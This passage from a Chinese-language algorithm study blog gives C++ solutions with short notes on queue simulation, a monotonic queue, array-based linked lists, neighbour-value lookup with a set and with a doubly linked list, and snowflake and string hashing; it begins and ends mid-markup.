class="hljs-type">int</span> q3[M], h3, t3 = <span class="hljs-number">-1</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_max</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> x = INT_MIN;<br><span class="hljs-keyword">if</span> (h1 &lt;= t1) x = <span class="hljs-built_in">max</span>(q1[h1], x);<br><span class="hljs-keyword">if</span> (h2 &lt;= t2) x = <span class="hljs-built_in">max</span>(q2[h2], x);<br><span class="hljs-keyword">if</span> (h3 &lt;= t3) x = <span class="hljs-built_in">max</span>(q3[h3], x);<br><span class="hljs-keyword">if</span> (x == q1[h1] &amp;&amp; h1 &lt;= t1) h1++;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (x == q2[h2] &amp;&amp; h2 &lt;= t2) h2++;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (x == q3[h3] &amp;&amp; h3 &lt;= t3) h3++;<br><span class="hljs-keyword">return</span> x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n, m, q, u, v, t;<br>cin &gt;&gt; n &gt;&gt; m &gt;&gt; q &gt;&gt; u &gt;&gt; v &gt;&gt; t;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; q1[i];<br>&#125;<br><span class="hljs-built_in">sort</span>(q1, q1 + n);<br><span class="hljs-built_in">reverse</span>(q1, q1 + n);<br>t1 = n - <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> delta = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">get_max</span>()+delta;<br><span class="hljs-keyword">if</span> (i % t == <span class="hljs-number">0</span>)<br>cout &lt;&lt; len &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-type">int</span> left = len * <span class="hljs-number">1ll</span> * u / v;  <span class="hljs-comment">//len乘以u会发生溢出，这里*1ll转化为long long类型</span><br><span class="hljs-type">int</span> right = len - left;<br>delta += q;<br>q2[++t2] = left - delta;<br>q3[++t3] = right - delta;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n + m; i++)<br>&#123;<br><span class="hljs-type">int</span> x = <span class="hljs-built_in">get_max</span>();<br><span class="hljs-keyword">if</span> (i % t == <span class="hljs-number">0</span>)<br>cout &lt;&lt; x+delta &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="双端队列">双端队列</h4><p>双端队列：坐标，单谷形式；</p><p>如果输入的数各不相同，只需计数下降趋势的个数；</p><p>一开始从正无穷开始下降，初始res为1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">200010</span>;<br>PII a[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; a[i].first;<br>a[i].second = i;<br>&#125;<br><span class="hljs-built_in">sort</span>(a, a + n);   <br><br><span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> last = INT_MAX;  <span class="hljs-comment">//上一个数的下标,可用n代替</span><br><span class="hljs-type">int</span> dir = <span class="hljs-number">-1</span>;   <span class="hljs-comment">//下降趋势</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n;)<br>&#123;<br><span class="hljs-comment">//双指针算法求重叠区间（i~j-1）</span><br><span class="hljs-type">int</span> j = i;<br><span class="hljs-keyword">while</span> (j &lt; n &amp;&amp; a[j].first == a[i].first) j++;<br><span class="hljs-comment">//sort已排好序</span><br><span class="hljs-type">int</span> minp = a[i].second;<br><span class="hljs-type">int</span> maxp = a[j - <span class="hljs-number">1</span>].second;<br><span class="hljs-keyword">if</span> (dir == <span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (last &gt; maxp)last = minp;<br><span class="hljs-keyword">else</span><br>&#123;<br>dir = <span class="hljs-number">1</span>;<br>last = maxp;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (last &lt; minp) last = maxp;<br><span class="hljs-keyword">else</span><br>&#123;<br>res++;<br>dir = <span class="hljs-number">-1</span>;<br>last = minp;<br>&#125;<br>&#125;<br>i = j;<br>&#125;<br>cout &lt;&lt; res &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最大子序列和单调队列">最大子序列和（单调队列）</h4><p>长度不超过M</p><figure><img src="/2024/12/03/algorithm-enhance/1733232430621.png" alt="1733232430621"><figcaption aria-hidden="true">1733232430621</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">300010</span>;<br><span class="hljs-type">int</span> q[N];    <span class="hljs-comment">//存储的是前缀和的下标</span><br><span class="hljs-type">int</span> sum[N];<br><span class="hljs-type">int</span> hh = <span class="hljs-number">1</span>, rr = <span class="hljs-number">1</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n, m;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; sum[i];<br>sum[i] += sum[i - <span class="hljs-number">1</span>];<br>&#125;<br>    <span class="hljs-comment">//队头插入sum[0]</span><br>    q[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ans = INT_MIN;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">while</span> (hh &lt;= rr &amp;&amp; i - q[hh] &gt; m) hh++;<br>ans = <span class="hljs-built_in">max</span>(ans, sum[i] - sum[q[hh]]);<br><span class="hljs-keyword">while</span> (hh &lt;= rr &amp;&amp; sum[q[rr]] &gt;= sum[i]) rr--;<br>q[++rr] = i;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表与邻接表">链表与邻接表</h3><h4 id="数组模拟链表">数组模拟链表：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><span class="hljs-comment">//e[i]:存储节点i的值</span><br><span class="hljs-comment">//ne[i]:存储节点i的下一个值的下标</span><br><span class="hljs-comment">//idx表示当前用到的下标(address)</span><br><span class="hljs-comment">//head存储头节点指向的节点的下标</span><br><span class="hljs-type">int</span> e[N],ne[N],head,idx;<br><span class="hljs-type">int</span> m;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head=<span class="hljs-number">-1</span>;<br>    idx=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//头插</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">head_insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx]=x;<br>    ne[idx]=head;<br>    head=idx;<br>    idx++;<br>&#125;<br><span class="hljs-comment">//插在第k+1个插入的节点之后</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx]=x;<br>    ne[idx]=ne[k];<br>    ne[k]=idx;<br>    idx++;<br>&#125;<br><span class="hljs-comment">//删除第k+1个插入的节点后的节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">delete_list</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    ne[k]=ne[ne[k]];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="邻值查找">邻值查找</h4><h5 id="平衡树set">平衡树（set）</h5><p><strong>依靠插入顺序来实现j在i之前</strong></p><p>将元素按顺序插入set，比较插入位置的前驱和后继即可得到最小值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br>set&lt;PII&gt; nums;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin &gt;&gt; n;<br><span class="hljs-type">int</span> a;<br>cin &gt;&gt; a;<br>nums.<span class="hljs-built_in">insert</span>(&#123; a,<span class="hljs-number">1</span> &#125;);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a;<br>nums.<span class="hljs-built_in">insert</span>(&#123; a,i &#125;);<br>set&lt;PII&gt;::iterator it = nums.<span class="hljs-built_in">find</span>(&#123; a,i &#125;);<br>PII ans = &#123; <span class="hljs-number">1e9</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">if</span> (++it != nums.<span class="hljs-built_in">end</span>())    <span class="hljs-comment">//nums.end()表示最后的元素的下一个元素</span><br>&#123;<br>ans = &#123; (*it).first - a,(*it).second &#125;;<br>&#125;<br>it--;<br><span class="hljs-keyword">if</span> (it-- != nums.<span class="hljs-built_in">begin</span>() &amp;&amp; a - (*it).first &lt;= ans.first) <span class="hljs-comment">//nums.begin()表示第一个元素，取等，有优先前驱</span><br>&#123;<br>ans = &#123; a - (*it).first , (*it).second &#125;;<br>&#125;<br>cout &lt;&lt; ans.first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ans.second &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="双向链表">双向链表</h5><p><strong>依靠从数组最后一个元素入手来实现j在i之前</strong></p><p>将数组排序插入有序双向链表，比较在链表中的前驱和后继即可得到最小值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br>PII a[N];<br><span class="hljs-type">int</span> e[N], l[N], r[N];<br><span class="hljs-type">int</span> n;<br>PII ans[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i].first;<br>a[i].second = i;<br>&#125;<br><span class="hljs-built_in">sort</span>(a + <span class="hljs-number">1</span>, a + <span class="hljs-number">1</span> + n);   <span class="hljs-comment">//&quot;值链表&quot;</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)  <br>&#123;<br>l[i] = i - <span class="hljs-number">1</span>;<br>r[i] = i + <span class="hljs-number">1</span>;<br>e[a[i].second] = i;  <span class="hljs-comment">//记录每个元素在链表中的位置</span><br>&#125;<br>a[<span class="hljs-number">0</span>] = &#123; <span class="hljs-number">-3e9</span><span class="hljs-number">-1</span>,<span class="hljs-number">0</span> &#125;;<br>a[n + <span class="hljs-number">1</span>] = &#123; <span class="hljs-number">3e9</span><span class="hljs-number">+1</span>,n + <span class="hljs-number">1</span> &#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &gt;= <span class="hljs-number">2</span>; i--)<br>&#123;<br><span class="hljs-type">int</span> loc = e[i];      <span class="hljs-comment">//获取其在链表中的位置</span><br><span class="hljs-type">int</span> left = l[loc];<br><span class="hljs-type">int</span> right = r[loc];<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> tmp1 = a[loc].first - a[left].first;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> tmp2 = a[right].first - a[loc].first;<br><span class="hljs-keyword">if</span> (tmp1 &lt;= tmp2)<br>&#123;<br>ans[i].first = tmp1;<br>ans[i].second = a[left].second;   <span class="hljs-comment">//原始序列的位置</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>ans[i].first = tmp2;<br>ans[i].second = a[right].second;<br>&#125;<br><span class="hljs-comment">//去掉该点</span><br>r[left] = right;<br>l[right] = left;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)<br>cout &lt;&lt; ans[i].first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ans[i].second &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="哈希">哈希</h3><h4 id="哈希表">哈希表</h4><h5 id="雪花">雪花</h5><p>哈希函数设置： <span class="math display">\[h() = (∑a + ∏a)mod P,其中P选择与N最接近的质数\]</span> 求质数：P=100003</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">100000</span>;i; i++)<br>&#123;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">2</span>; j * j &lt;= i; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (i % j == <span class="hljs-number">0</span>)<br>&#123;<br>flag = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br>cout &lt;&lt; i &lt;&lt; endl;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> P = <span class="hljs-number">100003</span>;<br><span class="hljs-type">int</span> head[N];<br><span class="hljs-type">int</span> ne[N];<br><span class="hljs-type">int</span> snow[N][<span class="hljs-number">6</span>];<br><span class="hljs-type">int</span> n, idx;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ha</span><span class="hljs-params">(<span class="hljs-type">int</span>* a)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>, mul = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br>sum =  sum + a[i]% P;<br>mul = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)mul * a[i] % P;<br>&#125;<br><span class="hljs-type">int</span> res = (sum + mul) % P;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">equal</span><span class="hljs-params">(<span class="hljs-type">int</span>* a, <span class="hljs-type">int</span>* b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; j++)<br>&#123;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">6</span>; k++)<br>&#123;<br><span class="hljs-keyword">if</span> (a[k] != b[(j + k) % <span class="hljs-number">6</span>]) flag = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (flag)<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">6</span>; k++)<br>&#123;<br><span class="hljs-keyword">if</span> (a[k] != b[(j + <span class="hljs-number">6</span> - k) % <span class="hljs-number">6</span>]) flag = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (flag) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span>* a)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> val = <span class="hljs-built_in">ha</span>(a);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = head[val]; i != <span class="hljs-number">0</span>; i = ne[i])<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">equal</span>(snow[i], a)) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">memcpy</span>(snow[++idx], a, <span class="hljs-number">6</span> * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>));<br>ne[idx] = head[val];<br>head[val] = idx;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> a[<span class="hljs-number">6</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) cin &gt;&gt; a[i];<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">insert</span>(a))<br>&#123;<br>flag = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag)cout &lt;&lt; <span class="hljs-string">&quot;Twin snowflakes found.&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">else</span> cout &lt;&lt; <span class="hljs-string">&quot;No two snowflakes are alike.&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="字符串哈希">字符串哈希</h4><p>A-Z：<strong>1</strong>-26编码，字符串看成p进制数，转换成10进制数，再进行hash映射（modQ）</p><p>(99.99%不冲突---&gt; 不处理冲突)</p><p>p:131或13331 ；</p><p>Q=2^64 用<strong>unsigned long long</strong>存储h，溢出相当于取模</p><p>作用：（比较子字符串是否相同）</p><figure><img src="/2024/12/03/algorithm-enhance/1733232476103.png" alt="1733232476103"><figcaption 